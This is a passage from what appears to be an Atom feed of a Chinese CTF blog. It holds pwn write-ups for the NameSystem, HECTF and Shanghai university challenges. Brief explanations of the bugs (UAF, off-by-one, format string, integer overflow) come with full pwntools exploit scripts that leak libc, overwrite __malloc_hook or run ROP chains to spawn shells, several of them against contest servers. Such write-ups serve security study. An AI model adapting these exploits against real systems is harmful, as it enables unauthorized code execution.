class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./NameSystem"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./NameSystem"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="comment">#p=remote("183.129.189.62",21305)</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Name Size:"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"The id you want to delete:"</span>,str(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'aaa'</span>+p64(<span class="number">0x602080</span>)+p64(<span class="number">0x000000000060200a</span>)+<span class="string">'\n'</span>)</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x41</span>)+p64(elf.symbols[<span class="string">'puts'</span>])[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">stdout=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x00007ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">success(<span class="string">"libc====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(system)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-hacknote&quot;&gt;0x01 Hacknote&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;静态编译的一个题，没开pie，没开nx,可以getsh
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="double free" scheme="http://Whali3n51.top/tags/double-free/"/>
    
      <category term="shellcode" scheme="http://Whali3n51.top/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>HECTF_Pwn_wp</title>
    <link href="http://whali3n51.top/2019/11/11/HECTF/"/>
    <id>http://whali3n51.top/2019/11/11/HECTF/</id>
    <published>2019-11-11T05:51:00.000Z</published>
    <updated>2020-01-08T06:52:44.102Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。</p><h2><span id="0x01-hard_pwn">0x01 hard_pwn</span></h2><p>就存在一个off-by-one，可以直接解造成堆块重叠，进而使用house of orange来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-pwn_disco">0x02 pwn_disco</span></h2><p>说实话本题画风还是挺搞笑的，运行程序的时候我笑了好久。存在漏洞有两个，让这一题变得简单起来，一个是格式化字符串，直接可以泄露出libc基址出来，另一个是UAF,当free堆块之后,存在悬挂指针，直接攻击__malloc_hook然后修改为one_gadget来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'draw:'</span>,<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7f7e0aafb830</span><span class="number">-0x7f7e0aadb000</span>)</span><br><span class="line">success(<span class="string">"libc_base===&gt;0x%x"</span>%libc_base)</span><br><span class="line">create(<span class="number">0</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">1</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+onegad[<span class="number">3</span>])+p64(libc_base+onegad[<span class="number">3</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x03-stackpwn2">0x03 stackpwn2</span></h2><p>这一题真新手向题目，也是存在两个洞，一个是格式化字符串来泄露canary,然后又存在栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./stackpwn2'</span>)</span><br><span class="line"><span class="comment">#p=remote('183.129.189.60',10000)</span></span><br><span class="line">p.recvuntil(<span class="string">'checking the output system...\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(<span class="number">0x000000000601018</span>)+p64(<span class="number">0x0400650</span>)+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What you want to do?\n"</span>,payload)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">obj=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">'aaaaaaaa'</span>+p64(<span class="number">0x00000000004009c3</span>)+p64(libc_base+obj.dump(<span class="string">"str_bin_sh"</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(<span class="number">0x0000000004008A2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-hard_pwn&quot;&gt;0x01 hard_pwn&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;就存在一个off-by-one，可以直接解造
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.top/tags/UAF/"/>
    
      <category term="house of orange" scheme="http://Whali3n51.top/tags/house-of-orange/"/>
    
  </entry>
  
  <entry>
    <title>上海大学生网络安全PWN_wp</title>
    <link href="http://whali3n51.top/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"/>
    <id>http://whali3n51.top/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/</id>
    <published>2019-11-11T05:37:00.000Z</published>
    <updated>2020-01-08T07:10:46.589Z</updated>
    
    <content type="html"><![CDATA[<p>最近没怎么更新博客，太忙了，最近得比赛有点多。</p><h2><span id="0x01-boringheap">0x01 boringheap</span></h2><p>这一道题主要是存在abs得整型溢出漏洞，当我输入0x80000000的时候，会溢出，会得到一个负数。在这一题里面当我们输入0x80000000的时候，再和0x40取余，会得到-0x20，最后能修改该chunk的chunk头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to delete?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(typd,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'3.Large\n'</span>,str(typd))</span><br><span class="line">p.sendafter(<span class="string">"Input Content:"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to update?\n'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Where you want to update?\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Input Content:\n'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which one do you want to view?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#0 0</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#1 0x40 </span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#2 0x80</span></span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#3 0xc0</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">create(<span class="number">1</span>,<span class="string">'A\n'</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x80000000</span>,<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#6</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span><span class="number">-88</span></span><br><span class="line">success(<span class="string">"libc_base====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#7 = 2</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#8 = 3</span></span><br><span class="line">fake_chunk_addr = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]+<span class="number">0x10</span>+<span class="number">0x10</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0x51</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#9</span></span><br><span class="line">__malloc_hook = libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,p64(fake_chunk_addr)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="string">'A\n'</span>)<span class="comment">#10</span></span><br><span class="line">create(<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x38</span>+p64(__malloc_hook<span class="number">-0x10</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="string">'A\n'</span>)<span class="comment">#11</span></span><br><span class="line">one_offset = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base+one_offset[<span class="number">3</span>]</span><br><span class="line">create(<span class="number">3</span>,p64(one)+<span class="string">'\n'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'5.Exit\n'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"3.Large\n"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-login">0x02 Login</span></h2><p>这一题有两种思路，一种是去爆破密码，还有一种就是去绕过密码验证，泄露got表，最后getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./login")</span></span><br><span class="line">p=remote(<span class="string">"8sdafgh.gamectf.com"</span>, <span class="number">20000</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the user id:\n"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Input the password length:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input password:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">"4"</span>)</span><br><span 